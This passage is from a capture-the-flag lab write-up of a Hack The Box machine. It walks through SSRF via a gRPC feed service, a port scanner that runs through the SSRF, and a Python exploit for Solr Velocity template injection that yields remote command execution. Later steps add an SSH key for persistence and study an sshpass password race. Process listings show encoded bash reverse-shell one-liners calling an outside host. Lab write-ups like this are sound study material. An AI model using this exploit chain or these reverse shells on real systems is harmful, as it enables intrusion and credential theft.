Next I ran the documented command to generate the python libraries needed to communicate with the server. This produced two files: `laser_pb2_grpc.py` and `laser_pb2.py`.

```python
import laser_pb2_grpc
import laser_pb2
import grpc
import base64
import pickle

def test():
    message = '{"version": "v1.0", "title": "Printer Feed", "feed_url": "http://10.10.15.98:8099"}'
    enc_message = base64.b64encode(pickle.dumps(message))
    #Use insecure channel since we do not have credentials
    channel = grpc.insecure_channel('printer.laserinternal.htb:9000')
    stub = laser_pb2_grpc.PrintStub(channel)
    response = stub.Feed(laser_pb2.Content(data=enc_message))
    print("Client received: " + response.message)

test()
```

I then wrote a python client `grpc_client.py` to connect to port 9000 on the server and send my request. I pointed the feed URL at my own machine to test the connection.  Then I set up a netcat listener to catch the reply.

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ nc -lvnp 8099                                 
listening on [any] 8099 ...
connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 55426
GET / HTTP/1.1
Host: 10.10.15.98:8099
User-Agent: FeedBot v1.0
Accept: */*
```

A connection came back to my netcat listener, though I wasn't sure what to do with it yet. Still, since I could coax the server into connecting to me using data I controlled, I reasoned I could attempt a Server Side Request Forgery \(SSRF\) attack and perhaps make it fetch a malicious file from my system.

```text
On successful data transmission you should see a message....
return service_pb2.Data(feed='Pushing feeds')
```

The PDF said I should receive the message `'Pushing feeds'`, yet I got no messages back at all.  

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ python3 grpc_client.py                                                                          1 ⨯
Traceback (most recent call last):
  File "grpc_client.py", line 15, in <module>
    test()
  File "grpc_client.py", line 12, in run
    response = stub.Feed(laser_pb2.Content(data=enc_message))
  File "/home/kac0/.local/lib/python3.8/site-packages/grpc/_channel.py", line 923, in __call__
    return _end_unary_response_blocking(state, call, False, None)
  File "/home/kac0/.local/lib/python3.8/site-packages/grpc/_channel.py", line 826, in _end_unary_response_blocking
    raise _InactiveRpcError(state)
grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
        status = StatusCode.UNKNOWN
        details = "Exception calling application: (7, 'Failed to connect to 10.10.15.98 port 8099: Connection refused')"
        debug_error_string = "{"created":"@1606012822.063558307","description":"Error received from peer ipv4:<YOUR_IP>:9000","file":"src/core/lib/surface/call.cc","file_line":1061,"grpc_message":"Exception calling application: (7, 'Failed to connect to 10.10.15.98 port 8099: Connection refused')","grpc_status":2}"
>
```

During some testing I forgot to start my listener and got the error above, since my machine refused the connection.  That verbose error proved useful later on.

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ python3 grpc_client.py
Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')
```

Once I redirected the target to the internal machine, the error message revealed a new hostname.  I appended it to my `/etc/hosts` file.  Directing traffic to that hostname still didn't fix my connection errors.

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ ping printer.laserinternal.htb               
PING printer.laserinternal.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from printer.laserinternal.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=40.9 ms
64 bytes from printer.laserinternal.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=41.6 ms
^C
--- printer.laserinternal.htb ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 40.902/41.234/41.566/0.332 ms
```

I could ping the machine via that hostname, so connectivity wasn't the issue.

### Python port scanner - internal machine

I figured the errors might stem from an internal port I couldn't reach, so I needed a way to enumerate from the inside.  Knowing that a closed port produced a "Connection refused error," I could use that to filter responses.

* [https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python](https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python) 
* [https://www.geeksforgeeks.org/port-scanner-using-python/](https://www.geeksforgeeks.org/port-scanner-using-python/)

```python
import laser_pb2_grpc
import laser_pb2
import grpc
import base64
import pickle

def scan():
    #Run the below code for all 65535 ports (minus 0)
    for port in range(1,65535):
        print(f"Trying port: {port}", end ='\r', flush = True)

        #Use insecure channel since we do not have credentials
        channel = grpc.insecure_channel('printer.laserinternal.htb:9000')
        stub = laser_pb2_grpc.PrintStub(channel)

        #Testing to see if there are more ports open on the internal localhost using same message
        message = '{' + '"version": "v1.0", "title": "Printer Feed", ' + f'"feed_url": "http://localhost:{port}"' + '}'
        #print(f"Message sent is {message}")
        enc_message = base64.b64encode(pickle.dumps(message))
        content = laser_pb2.Content(data=enc_message)
        try:
            response = stub.Feed(content)

            #Print the ports that respond to our connection, along with the message
            print(f"Port {port} open!")
            print(f"Connection received on port: {port}",response)
            print("")
            #print(str(response))

        except Exception as e:
            #str_e = str(e)
            #print(f"There was an error: {str_e}")
            if 'Connection refused' in e.details():
                continue
            print(f"Port {port} open!")
            print(e.details())
            print("")

scan()
```

I based the port scanner on `grpc_client.py`.  It was very slow because every port meant a full connection, a sent message, and a wait for the reply. I considered multithreading the script, but I had to head out so I just left it running.  

I did come across a solid example of a multi-threaded port scanner at [https://github.com/gh0x0st/python3\_multithreading](https://github.com/gh0x0st/python3_multithreading).  Their code is clean and well organized, so thanks to them for both that and the great examples!

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ python3 grpc_scan.py
Port 22 open!
Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')

Port 7983 open!
Exception calling application: (52, 'Empty reply from server')

Port 8983 open!
Connection received on port: 8983 feed: "Pushing feeds"

Port 9000 open!
Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')

Port 9100 open!
Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')
```

When I got home I saw five open ports, and port `8983` answered with the `feed: Pushing feeds` message the PDF had led me to expect.

### Solr exploitation

Searching for a port 8983 exploit pointed me to 

* [https://www.exploit-db.com/exploits/47572](https://www.exploit-db.com/exploits/47572)
* [https://github.com/veracode-research/solr-injection](https://github.com/veracode-research/solr-injection)
* [https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability](https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability)
* [https://github.com/jas502n/solr\_rce](https://github.com/jas502n/solr_rce)

Solr is an Apache open source application that delivers search and indexing over large volumes of data.  Combining the exploit code with my earlier client, I built a python script that would connect to the server, alter the configuration to enable code execution, and then run arbitrary commands passed as script arguments.  

```python
import laser_pb2
import laser_pb2_grpc
import grpc
import base64
import pickle
import os
import sys
from func_timeout import func_set_timeout, FunctionTimedOut
from urllib.parse import quote

#this data set will configure the system to allow command execution
data1 = "gopher://localhost:8983/_POST /solr/staging/config HTTP/1.1%0D%0AHost:127.0.0.1:8983%0D%0AContent-Type: application/json%0D%0AContent-Length:218%0D%0A%0D%0A{'update-queryresponsewriter': {'startup': 'lazy', 'name':'velocity', 'class': 'solr.VelocityResponseWriter', 'template.base.dir': '','solr.resource.loader.enabled': 'true', 'params.resource.loader.enabled':'true'}"

#need to use 'quote' since the argument is a string inside quotes with spaces; otherwise will be parsed as separate arguments
#this is the command injection I will use on the system to get a reverse shell
cmd = quote(sys.argv[1])
data2 = f"http://localhost:8983/solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

#Can't use direct variable substitution since I have two different vars this time.  Use feed.replace() instead
feed = '{"version": "v1.0", "title": "Printer Feed", "feed_url": "replaceMe"}'

#no creds, so need insecure channel
channel = grpc.insecure_channel("<YOUR_IP>:9000")
stub = laser_pb2_grpc.PrintStub(channel)

#this @func_set_timeout(5) will make it so execution will continue after 5 seconds; This is needed since it hangs on this part otherwise
@func_set_timeout(5)
def configServer():
  #need to replace the word "replaceMe" from the feed with the configuration string data1
  feed = feed.replace("replaceMe", data1)
  serialized = base64.b64encode(pickle.dumps(feed))
  dataToPrint = stub.Feed(laser_pb2.Content(data = serialized))
  print(dataToPrint.feed)

def get_shell():
  #need to replace the word "replaceMe" from the feed with the command injection string data2
  feed = feed.replace("replaceMe", data2)
  serialized = base64.b64encode(pickle.dumps(feed))
  dataToPrint = stub.Feed(laser_pb2.Content(data = serialized))
  print(dataToPrint.feed)

try:
    #Need to put this in try/except since it definitely causes an exception, which we will ignore and pass
    configServer()
except:
    pass

get_shell()
```

After plenty of trial and error, I got the code working and set up a netcat listener.  I made the payload a simple callback reverse shell and crossed my fingers.

## Initial Foothold

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ nc -lvnp 8099
listening on [any] 8099 ...
connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 36790
python3 -c 'import pty;pty.spawn("/bin/bash")'
solr@laser:~$ id && hostname
uid=114(solr) gid=120(solr) groups=120(solr)
laser
```

The machine connected back to my waiting nc listener!  I quickly upgraded the shell and checked what context I had landed in.  I was the user `solr`.  

```text
solr@laser:~$ echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNjkkEoBIEUE1qbriniZITFVwyL5zjbjJopB07xl9UAgAjbkTEx/IfL5xvd6cDNUHmW5KEkXTiNJm3sLBFfloVY=' >> .ssh/authorized_keys
```

Next, I dropped my public key into the `solr` user's `.ssh` folder so I could log in with a proper shell.

```text
solr@laser:/tmp/cypher/.ssh$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
printer:x:997:997::/home/printer:/bin/false
mosquitto:x:112:118::/var/lib/mosquitto:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
solr:x:114:120::/var/solr:/bin/bash
```

In `/etc/passwd` I noticed only two users could actually log in: `solr` and `root`.

### User.txt

```text
solr@laser:~$ cd /home/solr
solr@laser:/home/solr$ ls -la
total 16
drwxr-xr-x 3 root root 4096 Jun 29 06:55 .
drwxr-xr-x 3 root root 4096 Jun 29 06:55 ..
drwxr-xr-x 4 solr solr 4096 Jun 19  2020 feed_engine
-r-------- 1 solr solr   33 Dec 18 05:49 user.txt
solr@laser:/home/solr$ cat user.txt 
1cc8************************c762
```

The `user.txt` file sat in `/home/solr` as expected, though it threw me at first since that wasn't actually the user's home directory.

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `solr`

```text
┌──(kac0㉿kali)-[~/htb/laser]
└─$ ssh solr@<YOUR_IP> -i solr.key 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 19 Dec 2020 06:39:44 PM UTC

  System load:                      0.06
  Usage of /:                       43.2% of 19.56GB
  Memory usage:                     74%
  Swap usage:                       6%
  Processes:                        257
  Users logged in:                  1
  IPv4 address for br-3ae8661b394c: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          <YOUR_IP>
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:a0e8

73 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Aug  4 07:01:35 2020 from 10.10.14.3
solr@laser:~$
```

With an SSH key in place I logged in. The login banner showed IP addresses for several interfaces, which I wanted to investigate since docker containers frequently carry security weaknesses.

```text
solr@laser:/home/solr$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:a0:e8 brd ff:ff:ff:ff:ff:ff
    inet <YOUR_IP>/24 brd <YOUR_IP> scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:a0e8/64 scope global dynamic mngtmpaddr 
       valid_lft 86266sec preferred_lft 14266sec
    inet6 fe80::250:56ff:feb9:a0e8/64 scope link 
       valid_lft forever preferred_lft forever
3: br-3ae8661b394c: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ca:8b:6d:22 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-3ae8661b394c
       valid_lft forever preferred_lft forever
    inet6 fe80::42:caff:fe8b:6d22/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:7b:f2:02:91 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
918: veth405d5c3@if917: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-3ae8661b394c state UP group default 
    link/ether da:3b:a5:e4:8f:2e brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::d83b:a5ff:fee4:8f2e/64 scope link 
       valid_lft forever preferred_lft forever
```

It looked like a docker interface was running on `172.17.0.1/16`, with a container apparently hosted somewhere in the `172.18.0.1/16` range.

```text
solr@laser:~$ ps aux > /dev/shm/ps
solr@laser:~$ vim /dev/shm/ps
root        1053  0.0  0.1   9400  2976 ?        S    Dec18   0:00 sudo -u printer /opt/printer/printer.py 9100 /opt/printer/jobs/ /opt/printer/logs/print.log
root        1054  0.0  0.0   2608  1680 ?        S    Dec18   0:14 /bin/sh /opt/updates/run.sh
root        1055  0.0  0.1   9404  2848 ?        S    Dec18   0:00 sudo -u solr /home/solr/feed_engine/src/server.py
root        1062  0.0  0.2  12160  5960 ?        Ss   Dec18   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
printer     1067  0.0  0.3  94496  7620 ?        S    Dec18   0:03 python3 /opt/printer/printer.py 9100 /opt/printer/jobs/ /opt/printer/logs/print.log
solr        1068  0.1  0.7 1094192 15920 ?       Sl   Dec18   2:53 /usr/bin/python3 -u /home/solr/feed_engine/src/server.py
root        1069  0.0  0.4 107832  8444 ?        Ssl  Dec18   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
solr        1074  0.0  0.3  18552  7580 ?        Ss   Dec18   0:10 /lib/systemd/systemd --user
solr        1075  0.0  0.0 168548   636 ?        S    Dec18   0:00 (sd-pam)
solr        1146  1.2 58.7 3582388 1195460 ?     Sl   Dec18  27:17 java -server -Xms512m -Xmx512m -XX:+UseG1GC -XX:+PerfDisableSharedMem -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=250 -XX:+UseLargePages -XX:+AlwaysPreTouch -verbose:gc -XX:+PrintHeapAtGC -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -XX:+PrintTenuringDistribution -XX:+PrintGCApplicationStoppedTime -Xloggc:/var/solr/logs/solr_gc.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=9 -XX:GCLogFileSize=20M -Dsolr.log.dir=/var/solr/logs -Djetty.port=8983 -DSTOP.PORT=7983 -DSTOP.KEY=solrrocks -Dhost=127.0.0.1 -Duser.timezone=UTC -Djetty.home=/opt/solr/server -Dsolr.solr.home=/var/solr/data -Dsolr.data.home= -Dsolr.install.dir=/opt/solr -Dsolr.default.confdir=/opt/solr/server/solr/configsets/_default/conf -Dlog4j.configurationFile=file:/var/solr/log4j2.xml -Djetty.host=127.0.0.1 -Xss256k -Dsolr.jetty.https.port=8983 -Dsolr.log.muteconsole -XX:OnOutOfMemoryError=/opt/solr/bin/oom_solr.sh 8983 /var/solr/logs -jar start.jar --module=http
root        1566  0.0  1.7 1009096 34952 ?       Ssl  Dec18   1:07 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1582  0.0  0.0   2488   456 ?        S    Dec18   0:00 bpfilter_umh
root       22212  0.0  0.0      0     0 ?        I<   Dec18   0:00 [xfsalloc]
root       22213  0.0  0.0      0     0 ?        I<   Dec18   0:00 [xfs_mru_cache]
root       22216  0.0  0.0      0     0 ?        S    Dec18   0:00 [jfsIO]
root       22217  0.0  0.0      0     0 ?        S    Dec18   0:00 [jfsCommit]
root       22218  0.0  0.0      0     0 ?        S    Dec18   0:00 [jfsCommit]
root       22219  0.0  0.0      0     0 ?        S    Dec18   0:00 [jfsSync]
solr      330250  0.0  0.1   6892  3184 ?        S    Dec18   0:00 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNC82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}
solr      330254  0.0  0.1   7236  3576 ?        S    Dec18   0:00 bash -i
solr      330256  0.0  0.1   7236  3700 ?        S    Dec18   0:00 bash -i
solr      332101  0.0  0.2  13152  5436 ?        S    Dec18   0:00 python -c import pty;pty.spawn("/bin/bash")
solr      332102  0.0  0.1   7104  3740 pts/0    Ss+  Dec18   0:00 /bin/bash
solr      529611  0.0  0.1   6892  3092 ?        S    Dec18   0:00 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODYvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}
solr      529615  0.0  0.1   7236  3712 ?        S    Dec18   0:00 bash -i
solr      529617  0.0  0.1   7236  3692 ?        S    Dec18   0:00 bash -i
solr      531691  0.0  0.2  13152  5528 ?        S    Dec18   0:00 python -c import pty;pty.spawn("/bin/bash")
solr      531692  0.0  0.1   7104  3680 pts/1    Ss+  Dec18   0:00 /bin/bash
solr     1347816  0.0  0.1   6892  3244 ?        S    10:58   0:00 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODYvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}
solr     1347820  0.0  0.1   7236  3732 ?        S    10:58   0:00 bash -i
solr     1347822  0.0  0.1   7236  3708 ?        S    10:58   0:00 bash -i
solr      332101  0.0  0.2  13152  5436 ?        S    Dec18   0:00 python -c import pty;pty.spawn("/bin/bash")
solr      332102  0.0  0.1   7104  3740 pts/0    Ss+  Dec18   0:00 /bin/bash
solr      529611  0.0  0.1   6892  3092 ?        S    Dec18   0:00 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODYvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}
solr      529615  0.0  0.1   7236  3712 ?        S    Dec18   0:00 bash -i
solr      529617  0.0  0.1   7236  3692 ?        S    Dec18   0:00 bash -i
solr      531691  0.0  0.2  13152  5528 ?        S    Dec18   0:00 python -c import pty;pty.spawn("/bin/bash")
solr      531692  0.0  0.1   7104  3680 pts/1    Ss+  Dec18   0:00 /bin/bash
solr     1347816  0.0  0.1   6892  3244 ?        S    10:58   0:00 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODYvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}
solr     1347820  0.0  0.1   7236  3732 ?        S    10:58   0:00 bash -i
solr     1347822  0.0  0.1   7236  3708 ?        S    10:58   0:00 bash -i
solr     1357980  0.0  0.3  15960  8020 ?        S    11:11   0:00 python3 -c import pty;pty.spawn("/bin/bash")
solr     1357981  0.0  0.1   7236  3844 pts/2    Ss+  11:11   0:00 /bin/bash
solr     1469476  0.0  0.1   6892  3192 ?        S    13:36   0:00 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODYvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}
solr     1469480  0.0  0.1   7236  3856 ?        S    13:36   0:00 bash -i
solr     1469482  0.0  0.1   7236  3836 ?        S    13:36   0:00 bash -i
solr     1469726  0.0  0.3  15828  8124 ?        S    13:36   0:00 python3 -c import pty;pty.spawn("/bin/bash")
solr     1469727  0.0  0.2   7372  4172 pts/3    Ss+  13:36   0:00 /bin/bash
root     1496658  0.0  0.4  13772  8548 ?        Ss   14:01   0:00 sshd: root@pts/4
root     1496791  0.0  0.4  18564  8752 ?        Ss   14:01   0:01 /lib/systemd/systemd --user
root     1496793  0.0  0.1 168696  2632 ?        S    14:01   0:00 (sd-pam)
root     1496868  0.0  0.2   8276  5204 pts/4    Ss+  14:01   0:00 -bash
root     1672456  0.0  0.0      0     0 ?        I    17:50   0:00 [kworker/1:10-events]
root     1685999  0.0  0.0      0     0 ?        I    18:07   0:00 [kworker/u4:1-events_unbound]
root     1691624  0.0  0.0      0     0 ?        I    18:15   0:00 [kworker/1:2-events]
root     1695521  0.0  0.0      0     0 ?        I    18:20   0:00 [kworker/0:11-events]
root     1695522  0.0  0.0      0     0 ?        I    18:20   0:00 [kworker/0:12-events]
root     1695523  0.0  0.0      0     0 ?        I    18:20   0:00 [kworker/0:13-events]
root     1703320  0.0  0.0      0     0 ?        I    18:30   0:00 [kworker/0:1-events]
root     1704850  0.0  0.0      0     0 ?        I    18:31   0:00 [kworker/u4:2-events_unbound]
root     1709019  0.0  0.0      0     0 ?        I    18:37   0:00 [kworker/u4:0-events_power_efficient]
root     1710859  0.0  0.4  13636  8880 ?        Ss   18:39   0:00 sshd: solr [priv]
solr     1710944  0.0  0.2  13648  4992 ?        S    18:39   0:00 sshd: solr@pts/5
solr     1710945  0.0  0.2   8276  5032 pts/5    Ss   18:39   0:00 -bash
root     1711172  0.0  0.0      0     0 ?        I    18:40   0:00 [kworker/0:0-memcg_kmem_cache]
root     1711173  0.0  0.2 110108  5096 ?        Sl   18:40   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/20e3289bc183d662c0ed1ab34db33e47a78eefaebc817894699a423338ac086f -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root     1711191  0.0  0.0   4108   424 pts/0    Ss+  18:40   0:00 /bin/bash
root     1711274  0.0  0.1  12160  3168 ?        Ss   18:40   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root     1712446  0.0  0.0      0     0 ?        I    18:41   0:00 [kworker/u4:3]
root     1713717  0.0  0.0   2568  1740 ?        S    18:43   0:00 sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /opt/updates/files/jenkins-feed root@172.18.0.2:/root/feeds/
root     1713718  0.0  0.2   8840  4640 pts/6    Ss+  18:43   0:00 scp /opt/updates/files/jenkins-feed root@172.18.0.2:/root/feeds/
root     1713719  0.0  0.3  12008  6416 pts/6    S+   18:43   0:00 /usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -l root -- 172.18.0.2 scp -t /root/feeds/
root     1713720  0.0  0.4  13352  8620 ?        Ss   18:43   0:00 sshd: root
solr     1713735  0.0  0.1   8876  3352 pts/5    R+   18:43   0:00 ps aux
```

I looked through the running processes for clues about what the containers were doing, and spotted an interesting process tied to a container at 172.18.0.2.

### sshpass

```text
sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /opt/updates/files/jenkins-feed root@172.18.0.2:/root/feeds/
```

Here sshpass is feeding `root`'s password to SCP so it can copy the `jenkins-feed` file into a folder on the docker container.  I pulled up the sshpass man page to understand more about how it works and what it does.

> sshpass is a utility designed for running ssh using the mode referred to as "keyboard-interactive" password authentication, but in non-interactive mode.
>
> ssh uses direct TTY access to make sure that the password is indeed issued by an interactive keyboard user. Sshpass runs ssh in a dedicated tty, fooling it into thinking it is getting the password from an interactive user.
>
> The command to run is specified after sshpass' own options. Typically it will be "ssh" with arguments, but it can just as well be any other command. The password prompt used by ssh is, however, currently hardcoded into sshpass.
>
> Options If no option is given, sshpass reads the password from the standard input. The user may give at most one alternative source for the password:
>
> ```text
>    -p password
>          The  password  is  given  on the command line. Please note the section titled "SECURITY CONSIDERATIONS".
> ```
>
> SECURITY CONSIDERATIONS First and foremost, users of sshpass should realize that ssh's insistance on only getting the password interactively is not without reason. It is close to impossible to securely store the password, and users of sshpass should consider whether ssh's public key authentication provides the same end-user experience, while involving less hassle and being more secure.
>
>   The  -p  option should be considered the least secure of all of sshpass's options.  **All system users can see the password in the command line with a simple "ps"  command.  Sshpass  makes  a minimal  attempt  to hide the password, but such attempts are doomed to create race conditions without actually solving the problem.** Users of sshpass are encouraged to use one of the  other password passing techniques, which are all more secure.

In essence, this program exists to defeat SSH's "user presence" check when supplying plaintext passwords.  The `sshpass` man page itself flags a weakness in how the `-p` option is implemented.  I googled around for details on this race condition but couldn't find anything about exploiting it.  So I went looking for the source code to figure out what causes the race condition and whether I could exploit it.  

I found the code for sshpass on GitHub: [https://github.com/kevinburke/sshpass/blob/master/main.c](https://github.com/kevinburke/sshpass/blob/master/main.c)

![](assets/wu/laser/img-5.png)

```c
// Parse the command line. Fill in the "args" global struct with the results. Return argv offset
// on success, and a negative number on failure
static int parse_options( int argc, char *argv[] )
{
    int error=-1;
    int opt;

    // Set the default password source to stdin
    args.pwtype=PWT_STDIN;
    args.pwsrc.fd=0;

#define VIRGIN_PWTYPE if( args.pwtype!=PWT_STDIN ) { \
    fprintf(stderr, "Conflicting password source\n"); \
    error=RETURN_CONFLICTING_ARGUMENTS; }

    while( (opt=getopt(argc, argv, "+f:d:p:P:heVv"))!=-1 && error==-1 ) {
    switch( opt ) {
    case 'f':
        // Password should come from a file
        VIRGIN_PWTYPE;

        args.pwtype=PWT_FILE;
        args.pwsrc.filename=optarg;
        break;
    case 'd':
        // Password should come from an open file descriptor
        VIRGIN_PWTYPE;

        args.pwtype=PWT_FD;
        args.pwsrc.fd=atoi(optarg);
        break;
    case 'p':
        // Password is given on the command line
        VIRGIN_PWTYPE;

        args.pwtype=PWT_PASS;
        args.pwsrc.password=strdup(optarg);

            // Hide the original password from the command line
            {
                int i;

                for( i=0; optarg[i]!='\0'; ++i )
                    optarg[i]='z';
            }
        break;
        case 'P':
            args.pwprompt=optarg;
            break;
        case 'v':
            args.verbose++;
            break;
    case 'e':
        VIRGIN_PWTYPE;

        args.pwtype=PWT_PASS;
        args.pwsrc.password=getenv("SSHPASS");
            if( args.pwsrc.password==NULL ) {
                fprintf(stderr, "sshpass: -e option given but SSHPASS environment variable not set\n");

                error=RETURN_INVALID_ARGUMENTS;
            }
        break;
    case '?':
    case ':':
        error=RETURN_INVALID_ARGUMENTS;
        break;
    case 'h':
        error=RETURN_NOERROR;
        break;
    case 'V':
        printf("%s\n"
                    "(C) 2006-2011 Lingnu Open Source Consulting Ltd.\n"
                    "(C) 2015-2016 Shachar Shemesh\n"
            "This program is free software, and can be distributed under the terms of the GPL\n"
            "See the COPYING file for more information.\n"
                    "\n"
                    "Using \"%s\" as the default password prompt indicator.\n", PACKAGE_STRING, PASSWORD_PROMPT );
        exit(0);
        break;
    }
    }

    if( error>=0 )
    return -(error+1);
    else
    return optind;
}
```

Studying the source, I learned that the `-p` option reads the original password from the argument and then hides it by overwriting each character with a 'z', one at a time. The earlier `ps aux` output showed `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz` followed by the SCP command that received the password.  Because the password is initially supplied in plaintext, a race condition exists: the plaintext password can potentially be read from memory before it gets obfuscated.

```text
